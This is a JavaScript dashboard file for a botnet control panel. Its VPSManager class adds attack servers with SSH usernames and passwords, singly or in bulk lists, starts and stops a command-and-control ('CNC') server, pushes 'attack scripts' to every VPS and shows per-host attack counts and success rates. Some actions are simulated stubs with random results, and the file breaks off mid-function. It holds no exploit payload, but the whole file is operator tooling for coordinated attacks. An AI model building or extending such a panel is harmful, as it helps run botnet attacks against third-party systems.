class VPSManager {
    constructor() {
        this.apiUrl = window.auth.apiUrl;
        this.currentVPS = null;
        this.selectedVPS = new Set();
        this.init();
    }
    
    init() {
        this.checkAuth();
        this.setupEventListeners();
        this.loadVPSList();
        this.loadStats();
        this.startClock();
        this.initCharts();
        
        // Check CNC status
        this.checkCNCStatus();
    }
    
    checkAuth() {
        if (!Auth.isAuthenticated()) {
            window.location.href = 'index.html';
        }
        
        const user = Auth.getUser();
        document.getElementById('usernameDisplay').textContent = user.username;
        document.getElementById('userRole').textContent = user.role.charAt(0).toUpperCase() + user.role.slice(1);
        document.getElementById('userPlan').textContent = user.plan.toUpperCase();
        
        if (user.role !== 'owner') {
            // Hide admin-only buttons
            document.getElementById('addVPSBtn').style.display = 'none';
            document.getElementById('bulkImportBtn').style.display = 'none';
            document.getElementById('removeOfflineBtn').style.display = 'none';
            document.getElementById('startCNCBtn').style.display = 'none';
            document.getElementById('stopCNCBtn').style.display = 'none';
            document.getElementById('rebootAllBtn').style.display = 'none';
            document.getElementById('updateScriptsBtn').style.display = 'none';
            document.getElementById('backupConfigBtn').style.display = 'none';
        }
    }
    
    setupEventListeners() {
        // Add VPS button
        document.getElementById('addVPSBtn').addEventListener('click', () => {
            this.showAddVPSModal();
        });
        
        // Bulk import
        document.getElementById('bulkImportBtn').addEventListener('click', () => {
            this.showBulkImport();
        });
        
        // Check all VPS
        document.getElementById('checkAllBtn').addEventListener('click', () => {
            this.checkAllVPS();
        });
        
        // Remove offline VPS
        document.getElementById('removeOfflineBtn').addEventListener('click', () => {
            this.removeOfflineVPS();
        });
        
        // View options
        document.querySelectorAll('.view-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const view = e.target.dataset.view;
                this.changeView(view);
                
                // Update active state
                document.querySelectorAll('.view-btn').forEach(b => {
                    b.classList.remove('active');
                });
                e.target.classList.add('active');
            });
        });
        
        // Quick actions
        document.getElementById('startCNCBtn').addEventListener('click', () => {
            this.startCNC();
        });
        
        document.getElementById('stopCNCBtn').addEventListener('click', () => {
            this.stopCNC();
        });
        
        document.getElementById('rebootAllBtn').addEventListener('click', () => {
            this.rebootAllVPS();
        });
        
        document.getElementById('updateScriptsBtn').addEventListener('click', () => {
            this.updateScripts();
        });
        
        document.getElementById('backupConfigBtn').addEventListener('click', () => {
            this.backupConfig();
        });
        
        // Select all checkbox
        document.getElementById('selectAllVPS').addEventListener('change', (e) => {
            this.toggleSelectAllVPS(e.target.checked);
        });
        
        // Filter and sort
        document.getElementById('filterVPS').addEventListener('change', (e) => {
            this.filterVPS(e.target.value);
        });
        
        document.getElementById('sortVPS').addEventListener('change', (e) => {
            this.sortVPS(e.target.value);
        });
        
        // Bulk actions
        document.getElementById('bulkCheckBtn').addEventListener('click', () => {
            this.bulkCheckVPS();
        });
        
        document.getElementById('bulkRemoveBtn').addEventListener('click', () => {
            this.bulkRemoveVPS();
        });
        
        document.getElementById('bulkEnableBtn').addEventListener('click', () => {
            this.bulkEnableVPS();
        });
        
        // Search VPS
        document.getElementById('searchVPS').addEventListener('input', (e) => {
            this.searchVPS(e.target.value);
        });
        
        // Close details panel
        document.getElementById('closeDetailsPanel').addEventListener('click', () => {
            this.hideVPSDetails();
        });
        
        // Performance range
        document.getElementById('performanceRange').addEventListener('change', (e) => {
            this.updatePerformanceCharts(e.target.value);
        });
        
        // Test connection button in modal
        document.getElementById('testConnectionBtn')?.addEventListener('click', () => {
            this.testVPSConnection();
        });
        
        // Theme toggle
        document.getElementById('themeToggle').addEventListener('click', () => {
            this.toggleTheme();
        });
        
        // Logout
        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to logout?')) {
                window.auth.logout();
            }
        });
        
        // Modal close handlers
        document.querySelectorAll('.close-modal').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.target.closest('.modal').style.display = 'none';
            });
        });
        
        window.onclick = (e) => {
            if (e.target.classList.contains('modal')) {
                e.target.style.display = 'none';
            }
        };
    }
    
    async loadVPSList() {
        const tableBody = document.getElementById('vpsTableBody');
        
        try {
            const vpsList = await Auth.makeRequest('/vps');
            
            if (!vpsList || vpsList.length === 0) {
                tableBody.innerHTML = `
                    <tr class="empty-row">
                        <td colspan="9">
                            <div class="empty-state">
                                <i class="fas fa-server"></i>
                                <h3>No VPS Configured</h3>
                                <p>Add your first VPS to start using the botnet</p>
                                <button class="btn-add-first" onclick="window.vpsManager.showAddVPSModal()">
                                    <i class="fas fa-plus"></i> Add First VPS
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
                return;
            }
            
            tableBody.innerHTML = vpsList.map(vps => `
                <tr data-vps-id="${vps.id}" data-status="${vps.status}">
                    <td>
                        <input type="checkbox" class="vps-checkbox" value="${vps.id}">
                    </td>
                    <td>${vps.id}</td>
                    <td>
                        <div class="vps-host">
                            <strong>${vps.name || vps.host}</strong>
                            <small>${vps.host}</small>
                        </div>
                    </td>
                    <td>${vps.username}</td>
                    <td>
                        <span class="status-indicator ${vps.status}"></span>
                        <span class="status-text">${vps.status.toUpperCase()}</span>
                    </td>
                    <td>${vps.lastSeen ? new Date(vps.lastSeen).toLocaleTimeString() : 'Never'}</td>
                    <td>${vps.location || 'Unknown'}</td>
                    <td>
                        <span class="power-badge ${this.getPowerClass(vps.power)}">
                            ${vps.power || 5}/10
                        </span>
                    </td>
                    <td>
                        <div class="vps-actions">
                            <button class="btn-action test" onclick="window.vpsManager.testVPS(${vps.id})" title="Test Connection">
                                <i class="fas fa-signal"></i>
                            </button>
                            <button class="btn-action view" onclick="window.vpsManager.showVPSDetails(${vps.id})" title="View Details">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn-action remove" onclick="window.vpsManager.removeVPS(${vps.id})" title="Remove VPS">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </td>
                </tr>
            `).join('');
            
            // Add event listeners to checkboxes
            document.querySelectorAll('.vps-checkbox').forEach(checkbox => {
                checkbox.addEventListener('change', (e) => {
                    this.updateSelectedCount();
                });
            });
            
        } catch (error) {
            tableBody.innerHTML = `
                <tr class="error-row">
                    <td colspan="9">
                        <div class="error-state">
                            <i class="fas fa-exclamation-circle"></i>
                            <h3>Error loading VPS</h3>
                            <p>${error.message}</p>
                            <button class="btn-retry" onclick="window.vpsManager.loadVPSList()">
                                <i class="fas fa-sync-alt"></i> Retry
                            </button>
                        </div>
                    </td>
                </tr>
            `;
        }
    }
    
    async loadStats() {
        try {
            const vpsList = await Auth.makeRequest('/vps');
            const onlineCount = vpsList.filter(v => v.status === 'online').length;
            const offlineCount = vpsList.filter(v => v.status === 'offline').length;
            const activeCount = vpsList.filter(v => v.activeInAttacks > 0).length;
            
            // Update stats
            document.getElementById('onlineCount').textContent = onlineCount;
            document.getElementById('offlineCount').textContent = offlineCount;
            document.getElementById('totalCount').textContent = vpsList.length;
            document.getElementById('activeCount').textContent = activeCount;
            
            // Update quick stats
            document.getElementById('quickVPS').textContent = onlineCount;
            document.getElementById('vpsBadge').textContent = onlineCount;
            
            // Update chart data
            this.updateChartData(onlineCount, offlineCount, activeCount);
            
        } catch (error) {
            console.error('Failed to load VPS stats:', error);
        }
    }
    
    updateChartData(online, offline, active) {
        const chartOnline = document.getElementById('chartOnline');
        const chartOffline = document.getElementById('chartOffline');
        const chartActive = document.getElementById('chartActive');
        
        if (chartOnline) chartOnline.textContent = online;
        if (chartOffline) chartOffline.textContent = offline;
        if (chartActive) chartActive.textContent = active;
    }
    
    initCharts() {
        // Initialize VPS status chart
        const ctx = document.getElementById('vpsChart');
        if (ctx) {
            this.vpsChart = new Chart(ctx.getContext('2d'), {
                type: 'doughnut',
                data: {
                    labels: ['Online', 'Offline', 'Active in Attacks'],
                    datasets: [{
                        data: [5, 1, 3],
                        backgroundColor: [
                            'rgba(46, 213, 115, 0.8)',
                            'rgba(255, 71, 87, 0.8)',
                            'rgba(255, 165, 2, 0.8)'
                        ],
                        borderWidth: 1,
                        borderColor: 'rgba(255, 255, 255, 0.1)'
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            display: false
                        },
                        tooltip: {
                            callbacks: {
                                label: function(context) {
                                    return `${context.label}: ${context.raw} VPS`;
                                }
                            }
                        }
                    },
                    cutout: '70%'
                }
            });
        }
        
        // Initialize performance charts
        this.initPerformanceCharts();
    }
    
    initPerformanceCharts() {
        // Network chart
        const networkCtx = document.getElementById('networkChart');
        if (networkCtx) {
            this.networkChart = new Chart(networkCtx.getContext('2d'), {
                type: 'line',
                data: {
                    labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
                    datasets: [
                        {
                            label: 'Upload (Mbps)',
                            data: [120, 180, 250, 320, 280, 200],
                            borderColor: 'rgba(46, 213, 115, 0.8)',
                            backgroundColor: 'rgba(46, 213, 115, 0.1)',
                            tension: 0.4,
                            fill: true
                        },
                        {
                            label: 'Download (Mbps)',
                            data: [80, 120, 150, 180, 140, 100],
                            borderColor: 'rgba(30, 144, 255, 0.8)',
                            backgroundColor: 'rgba(30, 144, 255, 0.1)',
                            tension: 0.4,
                            fill: true
                        }
                    ]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'top',
                            labels: {
                                color: 'rgba(255, 255, 255, 0.8)'
                            }
                        }
                    },
                    scales: {
                        y: {
                            beginAtZero: true,
                            grid: {
                                color: 'rgba(255, 255, 255, 0.1)'
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.6)'
                            }
                        },
                        x: {
                            grid: {
                                color: 'rgba(255, 255, 255, 0.1)'
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.6)'
                            }
                        }
                    }
                }
            });
        }
        
        // CPU chart
        const cpuCtx = document.getElementById('cpuChart');
        if (cpuCtx) {
            this.cpuChart = new Chart(cpuCtx.getContext('2d'), {
                type: 'bar',
                data: {
                    labels: ['VPS #1', 'VPS #2', 'VPS #3', 'VPS #4', 'VPS #5'],
                    datasets: [{
                        label: 'CPU Load %',
                        data: [45, 28, 60, 35, 52],
                        backgroundColor: 'rgba(255, 71, 87, 0.8)',
                        borderColor: 'rgba(255, 71, 87, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            display: false
                        }
                    },
                    scales: {
                        y: {
                            beginAtZero: true,
                            max: 100,
                            grid: {
                                color: 'rgba(255, 255, 255, 0.1)'
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.6)'
                            }
                        },
                        x: {
                            grid: {
                                display: false
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.6)'
                            }
                        }
                    }
                }
            });
        }
        
        // Memory chart
        const memoryCtx = document.getElementById('memoryChart');
        if (memoryCtx) {
            this.memoryChart = new Chart(memoryCtx.getContext('2d'), {
                type: 'pie',
                data: {
                    labels: ['Used', 'Free', 'Cache'],
                    datasets: [{
                        data: [65, 25, 10],
                        backgroundColor: [
                            'rgba(255, 71, 87, 0.8)',
                            'rgba(46, 213, 115, 0.8)',
                            'rgba(255, 165, 2, 0.8)'
                        ],
                        borderWidth: 1,
                        borderColor: 'rgba(255, 255, 255, 0.1)'
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'right',
                            labels: {
                                color: 'rgba(255, 255, 255, 0.8)'
                            }
                        }
                    }
                }
            });
        }
    }
    
    updatePerformanceCharts(range) {
        // This would update charts based on time range
        // For now, just show a notification
        this.showNotification(`Showing performance data for: ${range}`, 'info');
    }
    
    showAddVPSModal() {
        const modal = document.getElementById('addVPSModal');
        modal.style.display = 'block';
        
        // Reset form
        const form = document.getElementById('addVPSForm');
        form.reset();
        
        // Set up tab switching
        document.querySelectorAll('.form-tabs .tab-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const tab = e.target.dataset.tab;
                
                // Update active tab
                document.querySelectorAll('.form-tabs .tab-btn').forEach(b => {
                    b.classList.remove('active');
                });
                e.target.classList.add('active');
                
                // Show content
                document.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                document.querySelector(`.tab-content[data-tab="${tab}"]`).classList.add('active');
            });
        });
        
        // Handle form submission
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            await this.addNewVPS();
        });
        
        // Handle bulk VPS list input
        const bulkTextarea = document.getElementById('bulkVPSList');
        if (bulkTextarea) {
            bulkTextarea.addEventListener('input', (e) => {
                this.previewBulkVPS(e.target.value);
            });
        }
    }
    
    async addNewVPS() {
        const modal = document.getElementById('addVPSModal');
        const activeTab = modal.querySelector('.tab-btn.active').dataset.tab;
        
        try {
            if (activeTab === 'single') {
                const vpsData = {
                    host: document.getElementById('vpsHost').value,
                    username: document.getElementById('vpsUsername').value,
                    password: document.getElementById('vpsPassword').value,
                    port: document.getElementById('vpsPort').value || 22,
                    name: document.getElementById('vpsName').value,
                    location: document.getElementById('vpsLocation').value
                };
                
                const result = await Auth.makeRequest('/vps', {
                    method: 'POST',
                    body: JSON.stringify(vpsData)
                });
                
                if (result.message) {
                    this.showNotification('VPS added successfully!', 'success');
                    modal.style.display = 'none';
                    this.loadVPSList();
                    this.loadStats();
                }
                
            } else if (activeTab === 'bulk') {
                const bulkList = document.getElementById('bulkVPSList').value;
                await this.processBulkVPS(bulkList);
                modal.style.display = 'none';
                
            } else if (activeTab === 'api') {
                this.showNotification('API import feature coming soon', 'info');
            }
            
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    previewBulkVPS(text) {
        const previewDiv = document.getElementById('bulkPreview');
        const previewList = previewDiv.querySelector('.preview-list');
        
        const lines = text.trim().split('\n').filter(line => line.trim());
        const vpsList = [];
        
        lines.forEach((line, index) => {
            const parts = line.split(':');
            if (parts.length >= 3) {
                vpsList.push({
                    host: parts[0],
                    username: parts[1],
                    password: parts[2],
                    port: parts[3] || 22
                });
            }
        });
        
        previewDiv.querySelector('h5').textContent = `Preview (${vpsList.length} VPS)`;
        
        if (vpsList.length > 0) {
            previewList.innerHTML = vpsList.map(vps => `
                <div class="vps-preview-item">
                    <i class="fas fa-server"></i>
                    <span>${vps.host} (${vps.username}:${vps.port})</span>
                </div>
            `).join('');
        } else {
            previewList.innerHTML = '<p class="empty-preview">No valid VPS entries found</p>';
        }
    }
    
    async processBulkVPS(text) {
        const lines = text.trim().split('\n').filter(line => line.trim());
        let successCount = 0;
        let errorCount = 0;
        
        for (const line of lines) {
            const parts = line.split(':');
            if (parts.length >= 3) {
                try {
                    const vpsData = {
                        host: parts[0],
                        username: parts[1],
                        password: parts[2],
                        port: parts[3] || 22
                    };
                    
                    await Auth.makeRequest('/vps', {
                        method: 'POST',
                        body: JSON.stringify(vpsData)
                    });
                    
                    successCount++;
                    
                } catch (error) {
                    errorCount++;
                    console.error(`Failed to add VPS: ${parts[0]}`, error);
                }
            }
        }
        
        this.showNotification(`Bulk import completed: ${successCount} successful, ${errorCount} failed`, 
                            errorCount === 0 ? 'success' : 'warning');
        
        this.loadVPSList();
        this.loadStats();
    }
    
    async testVPSConnection(vpsId = null) {
        if (vpsId) {
            // Test specific VPS
            try {
                const result = await Auth.makeRequest(`/vps/test/${vpsId}`, {
                    method: 'POST'
                });
                
                this.showNotification(result.message, result.success ? 'success' : 'error');
                
            } catch (error) {
                this.showNotification('Test failed: ' + error.message, 'error');
            }
        } else {
            // Test from modal
            const host = document.getElementById('vpsHost').value;
            const username = document.getElementById('vpsUsername').value;
            const password = document.getElementById('vpsPassword').value;
            const port = document.getElementById('vpsPort').value || 22;
            
            if (!host || !username || !password) {
                this.showNotification('Please fill in all required fields', 'error');
                return;
            }
            
            const testResult = document.getElementById('testResult');
            testResult.textContent = 'Testing connection...';
            testResult.className = 'test-result';
            testResult.style.display = 'block';
            
            try {
                // Simulate connection test
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // In real implementation, this would make an API call
                const success = Math.random() > 0.3; // 70% success rate for demo
                
                if (success) {
                    testResult.textContent = '✓ Connection successful! VPS is ready.';
                    testResult.className = 'test-result success';
                } else {
                    testResult.textContent = '✗ Connection failed. Check credentials and network.';
                    testResult.className = 'test-result error';
                }
                
            } catch (error) {
                testResult.textContent = '✗ Test failed: ' + error.message;
                testResult.className = 'test-result error';
            }
        }
    }
    
    showBulkImport() {
        const modal = document.getElementById('addVPSModal');
        modal.style.display = 'block';
        
        // Switch to bulk tab
        document.querySelectorAll('.form-tabs .tab-btn').forEach(btn => {
            btn.classList.remove('active');
            if (btn.dataset.tab === 'bulk') {
                btn.classList.add('active');
            }
        });
        
        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
            if (content.dataset.tab === 'bulk') {
                content.classList.add('active');
            }
        });
    }
    
    async checkAllVPS() {
        try {
            this.showNotification('Checking all VPS status...', 'info');
            
            // This would be an API call in real implementation
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            this.loadVPSList();
            this.loadStats();
            
            this.showNotification('VPS status check completed', 'success');
            
        } catch (error) {
            this.showNotification('Check failed: ' + error.message, 'error');
        }
    }
    
    async removeOfflineVPS() {
        if (!confirm('Remove all offline VPS? This action cannot be undone.')) {
            return;
        }
        
        try {
            const vpsList = await Auth.makeRequest('/vps');
            const offlineVPS = vpsList.filter(v => v.status === 'offline');
            
            if (offlineVPS.length === 0) {
                this.showNotification('No offline VPS found', 'info');
                return;
            }
            
            // Remove each offline VPS
            for (const vps of offlineVPS) {
                try {
                    await Auth.makeRequest(`/vps/${vps.id}`, {
                        method: 'DELETE'
                    });
                } catch (error) {
                    console.error(`Failed to remove VPS ${vps.id}:`, error);
                }
            }
            
            this.showNotification(`Removed ${offlineVPS.length} offline VPS`, 'success');
            this.loadVPSList();
            this.loadStats();
            
        } catch (error) {
            this.showNotification('Failed to remove offline VPS: ' + error.message, 'error');
        }
    }
    
    changeView(view) {
        // This would change the view between grid, list, and map
        this.showNotification(`Switched to ${view} view`, 'info');
    }
    
    async startCNC() {
        try {
            const result = await Auth.makeRequest('/cnc/start', {
                method: 'POST'
            });
            
            this.showNotification('CNC started successfully', 'success');
            this.checkCNCStatus();
            
        } catch (error) {
            this.showNotification('Failed to start CNC: ' + error.message, 'error');
        }
    }
    
    async stopCNC() {
        try {
            const result = await Auth.makeRequest('/cnc/stop', {
                method: 'POST'
            });
            
            this.showNotification('CNC stopped', 'warning');
            this.checkCNCStatus();
            
        } catch (error) {
            this.showNotification('Failed to stop CNC: ' + error.message, 'error');
        }
    }
    
    async checkCNCStatus() {
        try {
            const status = await Auth.makeRequest('/cnc/status');
            const cncStatus = document.getElementById('cncStatus');
            cncStatus.textContent = status.active ? 'ONLINE' : 'OFFLINE';
            cncStatus.className = `status-value ${status.active ? 'online' : 'offline'}`;
        } catch (error) {
            console.error('Failed to check CNC status:', error);
        }
    }
    
    async rebootAllVPS() {
        if (!confirm('Reboot all VPS? This will interrupt any ongoing attacks.')) {
            return;
        }
        
        try {
            this.showNotification('Rebooting all VPS...', 'warning');
            // This would be an API call
            await new Promise(resolve => setTimeout(resolve, 3000));
            this.showNotification('VPS reboot initiated', 'success');
        } catch (error) {
            this.showNotification('Reboot failed: ' + error.message, 'error');
        }
    }
    
    async updateScripts() {
        try {
            this.showNotification('Updating attack scripts on all VPS...', 'info');
            // This would be an API call
            await new Promise(resolve => setTimeout(resolve, 2000));
            this.showNotification('Scripts updated successfully', 'success');
        } catch (error) {
            this.showNotification('Update failed: ' + error.message, 'error');
        }
    }
    
    async backupConfig() {
        try {
            const result = await Auth.makeRequest('/vps/backup', {
                method: 'POST'
            });
            
            if (result.downloadUrl) {
                // Create download link
                const link = document.createElement('a');
                link.href = result.downloadUrl;
                link.download = `vps-backup-${new Date().toISOString().split('T')[0]}.json`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                this.showNotification('Backup downloaded successfully', 'success');
            } else {
                this.showNotification('Backup created', 'success');
            }
        } catch (error) {
            this.showNotification('Backup failed: ' + error.message, 'error');
        }
    }
    
    toggleSelectAllVPS(checked) {
        document.querySelectorAll('.vps-checkbox').forEach(checkbox => {
            checkbox.checked = checked;
            if (checked) {
                this.selectedVPS.add(checkbox.value);
            } else {
                this.selectedVPS.delete(checkbox.value);
            }
        });
        
        this.updateSelectedCount();
    }
    
    updateSelectedCount() {
        const selected = document.querySelectorAll('.vps-checkbox:checked').length;
        document.getElementById('selectedVPSCount').textContent = selected;
        
        // Update selected VPS set
        this.selectedVPS.clear();
        document.querySelectorAll('.vps-checkbox:checked').forEach(checkbox => {
            this.selectedVPS.add(checkbox.value);
        });
    }
    
    filterVPS(filter) {
        const rows = document.querySelectorAll('#vpsTableBody tr[data-vps-id]');
        
        rows.forEach(row => {
            switch(filter) {
                case 'online':
                    row.style.display = row.dataset.status === 'online' ? '' : 'none';
                    break;
                case 'offline':
                    row.style.display = row.dataset.status === 'offline' ? '' : 'none';
                    break;
                case 'active':
                    // This would check activeInAttacks property
                    row.style.display = 'none'; // Simplified for demo
                    break;
                case 'inactive':
                    row.style.display = ''; // Simplified for demo
                    break;
                default:
                    row.style.display = '';
            }
        });
    }
    
    sortVPS(sortBy) {
        // This would sort the VPS table
        this.showNotification(`Sorted by: ${sortBy}`, 'info');
    }
    
    async bulkCheckVPS() {
        if (this.selectedVPS.size === 0) {
            this.showNotification('No VPS selected', 'warning');
            return;
        }
        
        try {
            this.showNotification(`Checking ${this.selectedVPS.size} VPS...`, 'info');
            
            // This would be an API call for each selected VPS
            for (const vpsId of this.selectedVPS) {
                // Simulate check
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            this.showNotification('Selected VPS checked', 'success');
            this.loadVPSList();
            
        } catch (error) {
            this.showNotification('Bulk check failed: ' + error.message, 'error');
        }
    }
    
    async bulkRemoveVPS() {
        if (this.selectedVPS.size === 0) {
            this.showNotification('No VPS selected', 'warning');
            return;
        }
        
        if (!confirm(`Remove ${this.selectedVPS.size} selected VPS? This action cannot be undone.`)) {
            return;
        }
        
        try {
            this.showNotification(`Removing ${this.selectedVPS.size} VPS...`, 'warning');
            
            // Remove each selected VPS
            for (const vpsId of this.selectedVPS) {
                try {
                    await Auth.makeRequest(`/vps/${vpsId}`, {
                        method: 'DELETE'
                    });
                } catch (error) {
                    console.error(`Failed to remove VPS ${vpsId}:`, error);
                }
            }
            
            this.showNotification(`${this.selectedVPS.size} VPS removed`, 'success');
            this.selectedVPS.clear();
            this.loadVPSList();
            this.loadStats();
            
        } catch (error) {
            this.showNotification('Bulk remove failed: ' + error.message, 'error');
        }
    }
    
    async bulkEnableVPS() {
        if (this.selectedVPS.size === 0) {
            this.showNotification('No VPS selected', 'warning');
            return;
        }
        
        try {
            this.showNotification(`Enabling ${this.selectedVPS.size} VPS...`, 'info');
            
            // This would be an API call for each selected VPS
            for (const vpsId of this.selectedVPS) {
                // Simulate enable
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            this.showNotification('Selected VPS enabled', 'success');
            
        } catch (error) {
            this.showNotification('Bulk enable failed: ' + error.message, 'error');
        }
    }
    
    searchVPS(query) {
        const searchTerm = query.toLowerCase();
        const rows = document.querySelectorAll('#vpsTableBody tr[data-vps-id]');
        
        rows.forEach(row => {
            const text = row.textContent.toLowerCase();
            row.style.display = text.includes(searchTerm) ? '' : 'none';
        });
    }
    
    async showVPSDetails(vpsId) {
        try {
            const vpsList = await Auth.makeRequest('/vps');
            const vps = vpsList.find(v => v.id === vpsId);
            
            if (!vps) {
                this.showNotification('VPS not found', 'error');
                return;
            }
            
            this.currentVPS = vps;
            
            const panel = document.getElementById('vpsDetailsPanel');
            const content = document.getElementById('vpsDetailsContent');
            
            content.innerHTML = `
                <div class="vps-details">
                    <div class="details-header">
                        <div class="vps-title">
                            <h4>${vps.name || vps.host}</h4>
                            <span class="status-badge ${vps.status}">${vps.status.toUpperCase()}</span>
                        </div>
                        <div class="vps-power">
                            <span class="power-label">Power:</span>
                            <span class="power-value ${this.getPowerClass(vps.power)}">${vps.power || 5}/10</span>
                        </div>
                    </div>
                    
                    <div class="details-grid">
                        <div class="detail-item">
                            <span class="label">Host:</span>
                            <span class="value">${vps.host}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Username:</span>
                            <span class="value">${vps.username}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Port:</span>
                            <span class="value">${vps.port || 22}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Location:</span>
                            <span class="value">${vps.location || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Added By:</span>
                            <span class="value">${vps.addedBy}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Added Date:</span>
                            <span class="value">${new Date(vps.addedAt).toLocaleDateString()}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Last Seen:</span>
                            <span class="value">${vps.lastSeen ? new Date(vps.lastSeen).toLocaleString() : 'Never'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Uptime:</span>
                            <span class="value">${vps.uptime || 'N/A'}</span>
                        </div>
                    </div>
                    
                    <div class="vps-specs">
                        <h5>Hardware Specifications</h5>
                        <div class="specs-grid">
                            <div class="spec-item">
                                <i class="fas fa-microchip"></i>
                                <span>CPU:</span>
                                <strong>${vps.cpu || 'N/A'}</strong>
                            </div>
                            <div class="spec-item">
                                <i class="fas fa-memory"></i>
                                <span>RAM:</span>
                                <strong>${vps.ram || 'N/A'}</strong>
                            </div>
                            <div class="spec-item">
                                <i class="fas fa-hdd"></i>
                                <span>Storage:</span>
                                <strong>${vps.storage || 'N/A'}</strong>
                            </div>
                            <div class="spec-item">
                                <i class="fas fa-network-wired"></i>
                                <span>Bandwidth:</span>
                                <strong>${vps.bandwidth || 'N/A'} Mbps</strong>
                            </div>
                        </div>
                    </div>
                    
                    <div class="vps-stats">
                        <h5>Attack Statistics</h5>
                        <div class="stats-grid">
                            <div class="stat-item">
                                <span>Active in Attacks:</span>
                                <strong>${vps.activeInAttacks || 0}</strong>
                            </div>
                            <div class="stat-item">
                                <span>Total Attacks:</span>
                                <strong>${vps.totalAttacks || 0}</strong>
                            </div>
                            <div class="stat-item">
                                <span>Success Rate:</span>
                                <strong>${vps.successRate || 'N/A'}</strong>
                            </div>
                            <div class="stat-item">
                                <span>Avg Response Time:</span>
                                <strong>${vps.avgResponse || 'N/A'}</strong>
                            </div>
                        </div>
                    </div>
                    
                    <div class="vps-actions">
                        <button class="btn-action-large test" onclick="window.vpsManager.testVPS(${vps.id})">
                            <i class="fas fa-signal"></i>
                            <span>Test Connection</span>
                        </button>
                        <button class="btn-action-large restart" onclick="window.vpsManager.restartVPS(${vps.id})">
                            <i class="fas fa-redo"></i>
                            <span>Restart VPS</span>
                        </button>
                        <button class="btn-action-large remove" onclick="window.vpsManager.removeVPS(${vps.id})">
                            <i class="fas fa-trash"></i>
                            <span>Remove VPS</span>
                        </button>
                    </div>
                </div>
            `;
            
            panel.style.display = 'block';
            
        } catch (error) {
            this.showNotification('Failed to load VPS details: ' + error.message, 'error');
        }
    }
    
    hideVPSDetails() {
        document.getElementById('vpsDetailsPanel').style.display = 'none';
        this.currentVPS = null;
    }
    
    async testVPS(vpsId) {
        try {
            this.showNotification('Testing VPS connection...', 'info');
            
            // Simulate test
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Random result for demo
            const success = Math.random() > 0.3;
            
            if (success) {
                this.showNotification('VPS connection successful!', 'success');
            } else {
                this.showNotification('VPS connection failed', 'error');
            }
            
        } catch (error) {
            this.showNotification('Test failed: ' + error.message, 'error');
        }
    }
    
    async restartVPS(vpsId) {
        if (!confirm('Restart this VPS? This will interrupt any ongoing attacks.')) {
            return;
        }
        
        try {
            this.showNotification('Restarting VPS...', 'warning');
            
            // Simulate restart
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            this.showNotification('VPS restart initiated', 'success');
            
        } catch (error) {
            this.showNotification('Restart failed: ' + error.message, 'error');
        }
    }
    
    async removeVPS(vpsId) {
        if (!confirm('Remove this VPS? This action cannot be undone.')) {
            return;
        }
        
        try {
            const result = await Auth.makeRequest(`/vps/${vpsId}`, {
                method: 'DELETE'
            });
            
            if (result.message) {
                this.showNotification('VPS removed successfully', 'success');
                this.hideVPSDetails();
                this.loadVPSList();
                this.loadStats();
            }
            
        } catch (error) {
            this.showNotification('Failed to remove VPS: ' + error.message, 'error');
        }
    }
    
    getPowerClass(power) {
        if (power >= 8) return 'high';
        if (power >= 5) return 'medium';
        return 'low';
    }
    
    startClock() {
        function updateClock() {
            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const dateStr = now.toLocaleDateString();
            
            document.getElementById('currentTime').textContent = timeStr;
            document.getElementById('systemTime').textContent = `${dateStr} ${timeStr}`;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
    }
    
    toggleTheme() {
        document.body.classList.toggle('dark-theme');
        const icon = document.querySelector('#themeToggle i');
        if (document.body.classList.contains('dark-theme')) {
            icon.classList.remove('fa-moon');
            icon.classList.add('fa-sun');
        } else {
            icon.classList.remove('fa-sun');
            icon.classList.add('fa-moon');
        }
    }
    
    showNotification(message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
            <button class="close-notification">&times;</button>
        `;
        
        container.appendChild(notification);
        
        // Auto remove
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }
        }, 5000);
        
        // Close button
